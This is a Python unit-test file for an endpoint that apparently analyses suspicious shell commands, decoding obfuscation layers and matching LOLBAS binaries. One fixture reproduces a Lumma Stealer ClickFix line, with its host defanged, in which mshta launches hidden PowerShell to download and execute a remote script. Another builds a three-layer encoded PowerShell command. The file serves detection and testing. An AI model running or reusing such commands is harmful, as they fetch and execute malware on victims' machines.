"""
Backend unit tests for the /analyze endpoint.

Fixtures:
  LUMMA_CLICKFIX — Lumma Stealer ClickFix mshta payload pattern.
    Source: Huntress, "ClickFix: How to Infect Your PC in Three Easy Steps" (Oct 2024)
    https://www.huntress.com/blog/clickfix-how-to-infect-your-pc-in-three-easy-steps
    Defanged (hxxp) for safe storage; restore http before live testing.

  BENIGN — plain ls invocation; exercises the happy path.

  THREE_LAYER_PS — self-constructed 3-layer PowerShell:
    Layer 1: -EncodedCommand (base64 of UTF-16LE text)
    Layer 2: base64 of gzip-compressed bytes
    Layer 3: plaintext PS command
"""

from __future__ import annotations

import base64
import gzip
import re

import pytest

# ---------------------------------------------------------------------------
# Fixture builders
# ---------------------------------------------------------------------------

# Lumma Stealer ClickFix mshta payload — typical pattern documented by Huntress (Oct 2024).
# The victim is prompted to paste this into Run (Win+R) from a fake CAPTCHA page.
# mshta.exe is LOLBAS-catalogued under "execute" abuse.
LUMMA_CLICKFIX = (
    "mshta \"javascript:close();"
    "var r=new ActiveXObject('WScript.Shell');"
    "r.Run('powershell -ep bypass -noni -w hidden -c "
    "\\\"iex(New-Object Net.WebClient).DownloadString"
    "(\\\\\\\"hxxps://cdn.update-browser[.]xyz/fix.ps1\\\\\\\")\\\"\'"
    ",0,true);\""
)

BENIGN = "ls -la /tmp"


def _build_three_layer_ps() -> str:
    """
    Layer 3 (innermost): plaintext PS
    Layer 2: gzip-compress layer3, then base64
    Layer 1: PS command referencing layer2_b64, encoded as UTF-16LE base64
    Outer command: powershell.exe -EncodedCommand <layer1_b64>
    """
    # Layer 3
    layer3_text = "Write-Host 'level3-payload'"

    # Layer 2: gzip(layer3) → base64
    gz = gzip.compress(layer3_text.encode("utf-8"), mtime=0)
    layer2_b64 = base64.b64encode(gz).decode("ascii")

    # Layer 1: PS that decodes layer2 — will be UTF-16LE-encoded
    layer1_text = (
        "IEX([System.Text.Encoding]::UTF8.GetString("
        "[System.IO.Compression.GZipStream]::new("
        f"[System.IO.MemoryStream]::new([System.Convert]::FromBase64String(\"{layer2_b64}\")), "
        "[System.IO.Compression.CompressionMode]::Decompress).ReadToEnd()))"
    )
    layer1_b64 = base64.b64encode(layer1_text.encode("utf-16-le")).decode("ascii")

    return f"powershell.exe -NonInteractive -EncodedCommand {layer1_b64}"


THREE_LAYER_PS = _build_three_layer_ps()

SLUG_RE = re.compile(r"^[A-Z2-7]{12}$")


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------


async def post_analyze(client, command: str) -> dict:
    resp = await client.post("/analyze", json={"command": command})
    assert resp.status_code == 200, resp.text
    return resp.json()


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_health(client):
    resp = await client.get("/health")
    assert resp.status_code == 200
    assert resp.json() == {"status": "ok"}


@pytest.mark.asyncio
async def test_benign_command(client):
    data = await post_analyze(client, BENIGN)

    assert SLUG_RE.match(data["slug"]), f"slug {data['slug']!r} not base32-12"
    assert data["decoded_layers"] == [], "benign command should have no decode layers"
    assert data["lolbas_match"] is None, "ls should not match LOLBAS"
    assert data["parsed"] is not None


@pytest.mark.asyncio
async def test_slug_is_deterministic(client):
    d1 = await post_analyze(client, BENIGN)
    d2 = await post_analyze(client, BENIGN)
    assert d1["slug"] == d2["slug"]


@pytest.mark.asyncio
async def test_slug_format(client):
    data = await post_analyze(client, LUMMA_CLICKFIX)
    assert SLUG_RE.match(data["slug"]), f"slug {data['slug']!r} not valid base32-12"


@pytest.mark.asyncio
async def test_lumma_clickfix_lolbas(client):
    """mshta.exe should match the LOLBAS catalog when submodule is present."""
    data = await post_analyze(client, LUMMA_CLICKFIX)
    if data["lolbas_match"] is not None:
        assert data["lolbas_match"]["name"] is not None
        assert isinstance(data["lolbas_match"]["techniques"], list)


@pytest.mark.asyncio
async def test_three_layer_ps_outer_layer_decoded(client):
    """The -EncodedCommand outer layer (UTF-16LE) must appear in decoded_layers."""
    data = await post_analyze(client, THREE_LAYER_PS)
    layers = data["decoded_layers"]
    assert len(layers) >= 1, f"expected decode layers, got {layers}"
    encodings = {layer["encoding"] for layer in layers}
    assert any("utf16le" in enc for enc in encodings), (
        f"expected a utf16le layer, got {encodings}"
    )


@pytest.mark.asyncio
async def test_three_layer_ps_gzip_layer_decoded(client):
    """The gzip middle layer must also be decoded (2+ total layers)."""
    data = await post_analyze(client, THREE_LAYER_PS)
    layers = data["decoded_layers"]
    assert len(layers) >= 2, (
        f"expected at least 2 decode layers (utf16le + gzip), got {layers}"
    )
    encodings = [layer["encoding"] for layer in layers]
    assert any("gzip" in enc for enc in encodings), (
        f"expected a gzip layer, got {encodings}"
    )


@pytest.mark.asyncio
async def test_invalid_command_returns_422(client):
    resp = await client.post("/analyze", json={"command": ""})
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_missing_slug_returns_404(client):
    resp = await client.get("/c/AAAAAAAAAAAA")
    assert resp.status_code == 404


@pytest.mark.asyncio
async def test_get_analysis_after_post(client):
    data = await post_analyze(client, BENIGN)
    slug = data["slug"]
    resp = await client.get(f"/c/{slug}")
    assert resp.status_code == 200
    assert resp.json()["slug"] == slug
